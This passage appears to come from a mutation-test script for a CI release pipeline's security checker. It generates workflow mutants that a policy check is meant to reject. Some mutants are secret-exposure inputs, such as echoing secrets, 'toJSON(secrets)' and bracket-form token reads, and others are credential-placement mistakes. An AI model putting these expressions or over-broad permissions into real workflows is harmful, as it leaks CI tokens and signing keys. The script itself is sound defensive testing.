m c_badpath '=          name: signed-witness-rapk-ubuntu-24.04\n          path: witness-rapk-ubuntu-24.04\n' '          name: signed-witness-rapk-ubuntu-24.04\n          path: rapks/ubuntu-24.04\n' 'exactly' "SIGNER the signed rapk record is downloaded over the rapk files"
m c_idt     '=  compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      id-token: write\n' 'compare job' "SIGNER the compare job holds the id-token (an OIDC token can get a signing certificate)"
m c_wr      '=  compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: write\n' 'compare job' "SIGNER the compare job holds contents write"
m c_pk      '=  compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      packages: write\n' 'compare job' "SIGNER the compare job holds packages write"
m c_self    '=  compare:\n    runs-on: ubuntu-24.04\n'           '  compare:\n    runs-on: self-hosted\n'               'compare job' "SIGNER the compare job runs on a self-hosted runner"
m c_jenv    '=  compare:\n    runs-on: ubuntu-24.04\n'           '  compare:\n    env: {X: y}\n    runs-on: ubuntu-24.04\n' 'compare job' "SIGNER a job env on the compare job"
m c_senv    '=        run: bash bin/release-compare.sh\n'         '        env:\n          X: y\n        run: bash bin/release-compare.sh\n' 'compare job' "SIGNER an env on the compare step"
m c_sec     '=        run: bash bin/release-compare.sh\n'         '        env:\n          GH_TOKEN: ${{ secrets.X }}\n        run: bash bin/release-compare.sh\n' 'compare job' "SIGNER a secret on the compare step"
m c_wit     '=        run: bash bin/release-compare.sh\n'         '        run: bash bin/witnessed.sh release-compare bin/release-compare.sh\n' 'compare job' "SIGNER the compare step through Witness (Witness signs through the id-token the job must not hold)"
m c_build   '=        run: bash bin/release-compare.sh\n'         '        run: bash bin/build-apk.sh --out x\n'   'compare job' "SIGNER a build script in the compare job (each build is its own job)"
m c_if      '=        run: bash bin/release-compare.sh\n'         "        if: \${{ always() }}\n        run: bash bin/release-compare.sh\n" 'compare job' "SIGNER an if on the compare step (it could be skipped)"
m c_2steps  '=        run: bash bin/release-compare.sh\n'         '        run: bash bin/release-compare.sh\n      - run: echo hi\n' 'compare job' "SIGNER a second step in the compare job"
m c_norapk  '=      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: rapk-ubuntu-24.04-arm\n          path: rapks/ubuntu-24.04-arm\n' '' 'compare job' "SIGNER the compare job does not receive Rebuild's arm64 apks"
m c_dlimg   '=      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: rapk-ubuntu-24.04-arm\n          path: rapks/ubuntu-24.04-arm\n' '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: images\n          path: images\n' 'compare job' "SIGNER the compare job downloads an artifact it does not compare (images)"
m c_upname  '=          name: apk-compare\n          path: apk-compare\n          if-no-files-found: error\n' '          name: release-evidence\n          path: apk-compare\n          if-no-files-found: error\n' 'compare job' "SIGNER the compare job uploads under another name"
m c_upopt   '=          name: apk-compare\n          path: apk-compare\n          if-no-files-found: error\n' '          name: apk-compare\n          path: apk-compare\n' 'compare job' "SIGNER the compare upload may succeed with no file (if-no-files-found is not error)"
m r_rapk    'name: dist\n          path: dist'                'name: rapk-ubuntu-24.04\n          path: rapks/ubuntu-24.04' 'download'  "SIGNER the release job downloads a rapk (Rebuild's apks reach the signer)"
m v_nocmp   '=      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: apk-compare\n          path: apk-compare\n' '' 'download'  "SIGNER the verify job does not download the comparison result (the first occurrence: release-verify would have nothing to read)"
m r_nocmp   '(name: apk-compare\n          path: apk-compare\n.*?)      - uses: [^\n]*\n        with:\n          name: apk-compare\n          path: apk-compare\n' '\1' 'download'  "SIGNER the release job does not download the comparison result"
m s_rnorv    '=      - name: release-verify\n        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witnessed.sh release-verify bin/release-verify.sh\n      - name: release-apks\n' '      - name: release-apks\n' 'exactly' "AC1 (Astra R6) the release job's first witnessed step is not release-verify (no re-run before the credentials)"
# round 1 (Codex seat B): the steps between the first and last Witness step are Witness steps and nothing else, and an install never comes after the first four
m s_latemel  '=run: bash bin/witnessed.sh release-verify bin/release-verify.sh\n      - name: release-apks' 'run: bash bin/witnessed.sh release-verify bin/release-verify.sh\n      - name: install melange again\n        run: bash bin/install-build-tools.sh melange\n      - name: release-apks' 'between' "AC1 (Astra R4, round 1) a second melange install between release-verify and release-apks"
m s_latecos  '=run: bash bin/witnessed.sh release-apks bin/release-apks.sh\n' 'run: bash bin/witnessed.sh release-apks bin/release-apks.sh\n      - name: install cosign again\n        run: bash bin/install-scanner.sh cosign\n' 'between' "AC1 (Astra R4, round 1) an install between two Witness steps"
m s_latedl   '=run: bash bin/witnessed.sh release-verify bin/release-verify.sh\n      - name: release-apks' 'run: bash bin/witnessed.sh release-verify bin/release-verify.sh\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: images\n          path: images\n      - name: release-apks' 'downloads' "AC1 (Astra R4, round 1) a download between release-verify and release-apks"
# round 1 (Codex PR 415): the verify job's proof upload is exactly witness-release-verify holding the record directory
m s_vupname  '=name: witness-release-verify\n          path: witness-release-verify' 'name: witness-release\n          path: witness-release-verify' 'verify' "AC1 (Astra R6, round 1) the verify job's upload is named witness-release (it would collide with the release job's)"
m s_vuppath  '=name: witness-release-verify\n          path: witness-release-verify' 'name: witness-release-verify\n          path: docs' 'verify' "AC1 (Astra R6, round 1) the verify job's upload holds a path other than its Witness record"
# round 2 (Codex PR 415): the verify job's upload and downloads are exact
m s_vupwarn  '=          path: witness-release-verify\n          if-no-files-found: error\n' '          path: witness-release-verify\n' 'verify' "AC1 (Astra R6, round 2) the verify job's upload does not fail when it finds no file (the default is a warning)"
m s_vdist    '=      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: signed-witness-build\n' '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: witness-release-verify\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: signed-witness-build\n' 'verify' "AC1 (Astra R6, round 2) the verify job downloads dist into its proof directory (it would be uploaded with the record)"
# round 3 (Codex PR 415, a reproduced blocker): download-artifact trims its path input, so a padded path reached the directory the verify job uploads; the verify job's downloads are the exact nine pairs, and no download path has surrounding whitespace
m s_vws      '=      - name: release-verify\n' '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: digests\n          path: " witness-release-verify"\n      - name: release-verify\n' 'verify' "AC1 (Astra R6, round 3) a download into ' witness-release-verify' (the action trims the path) puts digests.json into the uploaded directory"
m s_vtrail   '=          name: signed-witness-build\n          path: witness-build\n' '          name: signed-witness-build\n          path: "witness-build "\n' 'verify' "AC1 (Astra R6, round 3) a download path with trailing whitespace"
m s_vdupdl   '=          name: provenance\n          path: provenance\n' '          name: provenance\n          path: provenance\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: provenance\n          path: provenance\n' 'verify' "AC1 (Astra R6, round 3) the same artifact downloaded twice in the verify job"
m s_vpair    '=          name: check-results\n          path: check-results\n' '          name: check-results\n          path: witness-check\n' 'verify' "AC1 (Astra R6, round 3) a verify download into another artifact's directory"
m s_rws      '=          name: images\n          path: images\n' '          name: images\n          path: " bin"\n' 'download' "AC1 (Astra R6, round 3) a release-job download whose padded path the action trims into bin/"
# round 4 (Codex PR 415): the release job's downloads are the exact fifteen pairs too (its upload witness-release holds the Witness record directories)
m s_rdupdl   '=          name: dist\n          path: dist\n' '          name: dist\n          path: dist\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: dist\n' 'release job' "AC1 (Astra R6, round 4) the release job downloads dist twice"
m s_rpair    '=          name: dist\n          path: dist\n' '          name: dist\n          path: witness-release-publish\n' 'release job' "AC1 (Astra R6, round 4) dist is downloaded into a Witness record directory of the release job's upload"
m s_rmissdl  '=      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: images\n          path: images\n' '' 'release job' "AC1 (Astra R6, round 4) the release job does not download the images"
m s_melorder 'install crane\n        run: bash bin/install-scanner.sh crane\n      - name: install melange\n        run: bash bin/install-build-tools.sh melange' 'install melange\n        run: bash bin/install-build-tools.sh melange\n      - name: install crane\n        run: bash bin/install-scanner.sh crane' 'start with checkout' "AC1 (Astra R4) melange installed before crane (the order is fixed: the three scanners' tools, then melange)"
m s_melscan 'install-build-tools.sh melange'               'install-scanner.sh melange'                             'none of checkout'   "AC1 (Astra R4) melange fetched by the scanner installer (it is the build-tools installer's, with its own pin)"
m s_order   'release-apks bin/release-apks.sh'              'release-sign bin/release-sign.sh'                       'exactly'            "AC1 two witnessed steps swapped (release-sign twice)"
m s_miss    '=      - name: release-assets\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-assets bin/release-assets.sh\n' '' 'exactly' "AC1 a witnessed step missing"
m s_nopv    '=      - name: release-postverify\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-postverify bin/release-postverify.sh\n' '' 'exactly' "AC1 (rule 79) the post-publish verification step missing from the Release stage"
m s_pvfirst 'release-postverify bin/release-postverify.sh'  'release-apks bin/release-apks.sh'                       'exactly'            "AC1 (rule 79) the post-publish step is not a witnessed step of its own (release-apks twice)"
m s_noif    '=      - name: release-publish\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n' '      - name: release-publish\n' 'exactly the if' "AC14 a witnessed step after release-verify without the release-candidate condition (it would run on a release candidate)"
m s_ifver   '=      - name: release-verify\n' '      - name: release-verify\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n' 'no if' "AC14 release-verify itself conditional (a release candidate would skip the tag rule and every verification)"
m s_ifwide  '=      - name: release-sign\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n' '      - name: release-sign\n        if: ${{ !contains(github.ref_name, '\''rc'\'') }}\n' 'exactly the if' "AC14 the condition widened to any tag containing rc (a near-miss must be refused by release-verify, never run half)"
m s_seven   '=      - name: release-postverify\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-postverify bin/release-postverify.sh\n' '      - name: release-postverify\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-postverify bin/release-postverify.sh\n      - name: release-extra\n        run: bash bin/witnessed.sh release-extra bin/release-extra.sh\n' 'exactly' "AC1 (rule 79) SEVEN witnessed steps (a step after the post-publish one) are refused: the job has exactly six"
m s_pvmid   'run: bash bin/witnessed.sh release-assets bin/release-assets.sh' 'run: bash bin/witnessed.sh release-postverify bin/release-postverify.sh' 'exactly' "AC1 (rule 79) the post-publish step before the assets step is refused: it is the last"
m s_extra   'run: bash bin/witnessed.sh release-verify bin/release-verify.sh' 'run: bash bin/witnessed.sh release-verify bin/release-verify.sh && echo done' 'none of checkout' "AC1 an extra command in a witnessed step"
m s_mism    'release-publish bin/release-publish.sh'        'release-publish bin/release-sign.sh'                    'none of checkout'   "AC1 a witnessed step running another script"
m s_direct  'run: bash bin/witnessed.sh release-verify bin/release-verify.sh' 'run: witness run --step release-verify -- bash bin/release-verify.sh' 'none of checkout' "AC1 a direct witness run (the helper is the one seam)"
m s_ghs     '      - name: install witness'                 '      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n      - name: install witness' 'uses not allowed' "AC1 github-script"
m s_comp    '      - name: install witness'                 '      - uses: ./.github/actions/x\n      - name: install witness' 'uses not allowed' "AC1 a local composite action"
m s_login   '      - name: install witness'                 '      - name: login\n        run: echo x | docker login ghcr.io -u u --password-stdin\n      - name: install witness' 'none of checkout' "AC1 a registry login step"
m s_dlafter '      - name: release-assets'                  '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: late\n      - name: release-assets' 'downloads' "AC1 a download after Witness started (rule 68)"
# ---- AC2: who holds which credential ----------------------------------------------------------------------------------------
c() { if mutate "$work/stage.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" credentials "$work/$1.yml"; fi; }
c c_melenv  'run: bash bin/install-build-tools.sh melange' 'env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/install-build-tools.sh melange' 'up to release-verify' "AC2 (Astra R4) the melange install step carries the token"
c c_vsec    '=      - name: release-verify\n'                       '      - name: release-verify\n        env:\n          GH_TOKEN: ${{ github.token }}\n' 'verify job' "AC2 (Astra R6) the verify job's Witness step carries the token (the verify job holds no credential)"
c c_rcos    '=      - name: install cosign\n        run: bash bin/install-scanner.sh cosign\n' '      - name: install cosign\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/install-scanner.sh cosign\n' 'up to release-verify' "AC2 (Astra R6) the release job reads the token before its re-run of release-verify"
c c_rdlsec  '=name: dist\n          path: dist'                   'name: dist\n          path: dist\n          token: ${{ secrets.DOCKERHUB_TOKEN }}' 'up to release-verify' "AC2 (Astra R6) the release job reads a secret in a download before its re-run of release-verify"
c c_vbrk    '=      - name: install witness\n'                      '      - name: x ${{ secrets["OTHER_SECRET"] }}\n'                       'verify job' "AC2 (Astra R6, round 1) the verify job reads a secret through the bracket form in a step name"
c c_rbrk    '=      - name: install cosign\n'                       '      - name: x ${{ github["token"] }}\n'                                'up to release-verify' "AC2 (Astra R6, round 1) the release job reads the token through the bracket form before its re-run of release-verify"
c c_vjson   '=      - name: install witness\n'                      '      - name: x ${{ toJSON(github) }}\n'                                  'verify job' "AC2 (Astra R6, round 2) the verify job holds an expression (the whole github context)"
c c_rjson   '=      - name: install cosign\n'                       '      - name: x ${{ toJSON(secrets) }}\n'                                 'up to release-verify' "AC2 (Astra R6, round 2) the release job holds an expression (all secrets) before its re-run of release-verify"
c c_vsq     '=      - name: install witness\n'                      '      - name: "x ${{ github['\''token'\''] }}"\n'                            'verify job' "AC2 (Astra R6, round 2) the verify job reads the token through the single-quoted bracket form (the executable one)"
c c_rsq     '=      - name: install cosign\n'                       '      - name: "x ${{ secrets['\''DOCKERHUB_TOKEN'\''] }}"\n'                  'up to release-verify' "AC2 (Astra R6, round 2) the release job reads a secret through the single-quoted bracket form before its re-run of release-verify"
c c_vwrap   '=      - name: install witness\n'                      '      - name: x ${{ format('\''{0}'\'', github) }}\n'                          'verify job' "AC2 (Astra R6, round 2) the verify job passes the github context through format()"
c c_chk     'persist-credentials: false'                   'persist-credentials: false\n        env:\n          GH_TOKEN: ${{ github.token }}' 'compare job' "AC2 the token on the compare job's checkout step"
c c_chkr    '(environment: release\n    permissions:\n      contents: write\n      packages: write\n      id-token: write\n    steps:\n      - uses: [^\n]*\n        with:\n          persist-credentials: false)' '\1\n        env:\n          GH_TOKEN: ${{ github.token }}' 'up to release-verify' "AC2 the token on the release job's checkout step"
c c_dlsec   'name: images\n          path: images'        'name: images\n          path: images\n          token: ${{ secrets.DOCKERHUB_TOKEN }}' 'up to release-verify' "AC2 a secret in a download"
c c_vfy     '      - name: release-verify\n'               '      - name: release-verify\n        env:\n          GH_TOKEN: ${{ github.token }}\n' 'up to release-verify' "AC2 any env on the verify step"
c c_apkpub  '=DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-publish' 'DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n          GH_TOKEN: ${{ github.token }}\n          APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}\n        run: bash bin/witnessed.sh release-publish' 'release-publish' "AC2 the apk signing key in the publish step"
c c_hubapk  '=APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}' 'APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}\n          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}' 'release-apks' "AC2 a registry token in the apk step"
c c_assets  '=      - name: release-assets\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          GH_TOKEN: ${{ github.token }}\n' '      - name: release-assets\n' 'release-assets' "AC2 the assets step without its token"
c c_assreg  '=          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-assets' '          GH_TOKEN: ${{ github.token }}\n          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n        run: bash bin/witnessed.sh release-assets' 'release-assets' "AC2 a registry token in the assets step"
c c_ghsec   '=          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-assets' '          GH_TOKEN: ${{ secrets.OTHER }}\n        run: bash bin/witnessed.sh release-assets' 'whole read' "AC2 GH_TOKEN from another secret"
c c_part    '=DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-sign' 'DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}x\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-sign' 'whole read' "AC2 a credential read in part"
c c_foo     '=APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}' 'APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}\n          FOO: bar' 'release-apks' "AC2 an extra variable in the apk step"
# W1: the federation entries are exact literals on exactly the six witnessed steps of the release job
c c_fedver  '=      - name: release-verify\n        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witnessed.sh release-verify bin/release-verify.sh' '      - name: release-verify\n        run: bash bin/witnessed.sh release-verify bin/release-verify.sh' 'release-verify' "W1 the release job's release-verify step without the federation entries (the helper stops before it signs)"
c c_fedpub  '=          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          DOCKERHUB_USERNAME' '          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          DOCKERHUB_USERNAME' 'release-publish' "W1 release-publish without the role entry"
c c_fedvar  'AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing' 'AWS_ROLE_ARN: ${{ vars.ROLE }}' 'literals' "W1 the role is a variable lookup, not a literal"
c c_fedacc  'AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing' 'AWS_ROLE_ARN: arn:aws:iam::111111111111:role/fosterstack-cache-release-signing' 'AWS_ROLE_ARN' "W1 the role of another account"
c c_fedreg  'AWS_REGION: us-east-1' 'AWS_REGION: eu-west-1' 'AWS_REGION' "W1 another region"
c c_fedkey  'RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing' 'RELEASE_KMS_KEY_REF: awskms:///alias/other' 'RELEASE_KMS_KEY_REF' "W1 a key reference that is not the verifier's RELEASE_KEY_REF"
c c_fedinst '=      - name: install cosign\n        run: bash bin/install-scanner.sh cosign\n' '      - name: install cosign\n        env:\n          AWS_REGION: us-east-1\n        run: bash bin/install-scanner.sh cosign\n' 'up to release-verify' "W1 a federation entry on a step before release-verify that is not a witnessed one"
c c_fedlate 'run: bash bin/release-compare.sh' 'env:\n          AWS_REGION: us-east-1\n        run: bash bin/release-compare.sh' 'compare job' "W1 a federation entry on the compare job's step (the compare job holds no credential and no federation)"
c c_upenv   '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: release-evidence' '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        env:\n          GH_TOKEN: ${{ github.token }}\n        with:\n          name: release-evidence' 'only the witnessed' "AC2 an env on an upload step"
c c_pvnone  '=      - name: release-postverify\n        if: ${{ !contains(github.ref_name, '\''-'\'') }}\n        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          GH_TOKEN: ${{ github.token }}\n' '      - name: release-postverify\n' 'release-postverify' "AC2 (rule 79) the post-publish step without its read token"
c c_pvreg   '=          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-postverify' '          GH_TOKEN: ${{ github.token }}\n          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n        run: bash bin/witnessed.sh release-postverify' 'release-postverify' "AC2 (rule 79, rule 66) a registry credential in the post-publish step, which needs read access only"
# ---- AC3: nothing outside the release job holds them -------------------------------------------------------------------------
o() { rm -rf "$work/$1"; cp -r "$work/o" "$work/$1"; python3 - "$work/$1/.github/workflows/$2" "$3" <<'PY'
import sys
open(sys.argv[1], "a").write(sys.argv[2] + "\n")
PY
  expect caught "$5" "$4" others "$work/$1"; }
o o_pkg   stage-build.yml '      packages: write'               'packages write'      "AC3 packages write in another stage"
o o_sec   stage-verify.yml '      - run: echo ${{ secrets.X }}'  'packages write or a secret' "AC3 a secret in another stage"
o o_dh    stage-sign.yml   '      - run: echo DOCKERHUB_TOKEN'   'a release credential' "AC3 a registry credential in Sign"
o o_apk   stage-reproducibility.yml '# APK_RELEASE_SIGNING_KEY'   'a release credential' "AC3 the apk signing key named in Rebuild (even in a comment)"
o o_env   stage-build.yml  '    environment: release'            'release environment' "AC3 the release environment in Build"
o o_rdh   release.yml      '# DOCKERHUB_TOKEN'                   'release credential'  "AC3 release.yml names a registry credential"
rm -rf "$work/o_wf"; cp -r "$work/o" "$work/o_wf"; python3 - "$work/o_wf/.github/workflows/release.yml" <<'PY'
import sys
t = open(sys.argv[1]).read().replace("permissions:\n  contents: read\njobs", "permissions:\n  contents: read\n  packages: write\njobs", 1)
open(sys.argv[1], "w").write(t)
PY
expect caught "AC3 release.yml grants packages write at the workflow level" "workflow level" others "$work/o_wf"
rm -rf "$work/o_inh"; cp -r "$work/o" "$work/o_inh"; python3 - "$work/o_inh/.github/workflows/release.yml" <<'PY'
import sys
t = open(sys.argv[1]).read().replace("    uses: ./.github/workflows/stage-build.yml", "    uses: ./.github/workflows/stage-build.yml\n    secrets: inherit", 1)
open(sys.argv[1], "w").write(t)
PY
expect caught "AC3 a stage call that inherits the secrets" "passes secrets" others "$work/o_inh"
rm -rf "$work/o_cp"; cp -r "$work/o" "$work/o_cp"; python3 - "$work/o_cp/.github/workflows/release.yml" <<'PY'
import sys
t = open(sys.argv[1]).read().replace("  check:\n    needs: [build, sign]\n    uses: ./.github/workflows/stage-verify.yml", "  check:\n    needs: [build, sign]\n    uses: ./.github/workflows/stage-verify.yml\n    permissions:\n      packages: write", 1)
open(sys.argv[1], "w").write(t)
PY
expect caught "AC3 the Check call grants packages write (only the release job may)" "only the release job" others "$work/o_cp"
# ---- AC11: the job graph -----------------------------------------------------------------------------------------------------
gm() { if mutate "$work/release.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" graph "$work/$1.yml"; fi; }
# Rule 70 (advisor step-5 revisit, Oct 10), amended by the Witness move (owner Oct 22): Sign signs the building stages' records, so Rebuild and Check run side by side AFTER sign,
# sign-rebuild signs Rebuild's records, and the release job needs EXACTLY check, sign and sign-rebuild. Build is reached through check (check needs build and sign).
gm g_nosc    'needs: \[check, sign, sign-rebuild, sign-check\]'  'needs: [check, sign, sign-rebuild]'                       'exactly check, sign, sign-rebuild and sign-check' "REL-011 release does not need sign-check (Check's signed record)"
gm g_scnochk '  sign-check:\n    needs: \[build, check\]'     '  sign-check:\n    needs: [build]'                       'sign-check must need exactly build and check' "REL-011 sign-check does not wait for check"
gm g_scnobld '  sign-check:\n    needs: \[build, check\]'     '  sign-check:\n    needs: [check]'                       'sign-check must need exactly build and check' "REL-011 sign-check does not wait for build"
gm g_scextra '  sign-check:\n    needs: \[build, check\]'     '  sign-check:\n    needs: [build, check, rebuild]'       'sign-check must need exactly build and check' "REL-011 sign-check also waits for rebuild"
gm g_nosign  'needs: \[check, sign, sign-rebuild, sign-check\]'            'needs: [check, sign-rebuild, sign-check]'                            'exactly check, sign, sign-rebuild and sign-check' "AC11 release does not need sign"
gm g_nochk   'needs: \[check, sign, sign-rebuild, sign-check\]'            'needs: [sign, sign-rebuild, sign-check]'                             'exactly check, sign, sign-rebuild and sign-check' "AC11 release does not need check"
gm g_norb    'needs: \[check, sign, sign-rebuild, sign-check\]'            'needs: [check, sign, sign-check]'                                    'exactly check, sign, sign-rebuild and sign-check' "AC11 release does not need sign-rebuild (Rebuild's signed record)"
gm g_extra   'needs: \[check, sign, sign-rebuild, sign-check\]'            'needs: [check, sign, sign-rebuild, sign-check, decide]'              'exactly check, sign, sign-rebuild and sign-check' "AC11 release waits for something else"
gm g_relbld  'needs: \[check, sign, sign-rebuild, sign-check\]'            'needs: [build, check, sign, sign-rebuild, sign-check]'               'exactly check, sign, sign-rebuild and sign-check' "AC11 release also lists build (not exactly the set: build is reached through check)"
gm g_relrb   'needs: \[check, sign, sign-rebuild, sign-check\]'            'needs: [check, rebuild, sign, sign-rebuild, sign-check]'             'exactly check, sign, sign-rebuild and sign-check' "AC11 release also lists rebuild (its signed record is what Release needs)"
gm g_rbnosign '  rebuild:\n    needs: \[build, sign\]'         '  rebuild:\n    needs: build'                          'rebuild must need exactly build and sign' "AC11 rebuild does not wait for sign"
gm g_srnoreb '  sign-rebuild:\n    needs: \[build, rebuild\]'  '  sign-rebuild:\n    needs: [build]'                       'sign-rebuild must need exactly build and rebuild' "AC11 sign-rebuild does not wait for rebuild"
gm g_always  '  rebuild:\n    needs: \[build, sign\]'          "  rebuild:\n    if: \${{ always() }}\n    needs: [build, sign]"  'no if' "AC11 rebuild runs even when build failed"
gm g_prom    '=    if: ${{ startsWith(github.ref, '\''refs/tags/v'\'') && !inputs.dry-run }}' '    if: ${{ !cancelled() }}' 'exactly the if' "AC11 release runs when a predecessor was skipped"
gm g_coe     '  sign:\n    needs: build'                    '  sign:\n    continue-on-error: true\n    needs: build'   'continue-on-error' "AC11 sign may fail without stopping release"
gm g_sec     '  check:\n    needs: \[build, sign\]'          '  check:\n    secrets: inherit\n    needs: [build, sign]'  'secrets'  "AC11 the Check call inherits secrets"
gm g_perm    '      packages: write\n      id-token: write\n'  '      id-token: write\n'                                'permissions'        "AC11 the release job cannot publish"
gm g_uses    '    uses: ./.github/workflows/stage-promote.yml' '    uses: ./.github/workflows/stage-verify.yml'          'stage-promote.yml'  "AC11 the release job calls another workflow"
# Q9 (advisor, Oct 10): the ratified rules call the last stage Release, so release.yml's last job is named release (PR 2's and PR 3's judges)
gm g_promo   '  release:\n    if'                            '  promotion:\n    if'                                     'the last job is named release' "AC11 the last job named promotion (the ratified name is release, Q9)"
gm g_tag     '  rebuild:\n    needs: \[build, sign\]' '  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: git tag v9.9.9 && git push origin v9.9.9\n  rebuild:\n    needs: [build, sign]' 'creates a tag' "AC11 a job of release.yml other than decide (the CI patch tag, REQ-REL-009) creates a tag"
if mutate "$work/release.yml" "$work/g_decideok.yml" '=  decide:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ secrets.AUDITOR_APP_ID }}' '  decide:\n    runs-on: ubuntu-latest\n    steps:\n      - run: git push origin refs/tags/v9.9.9'; then
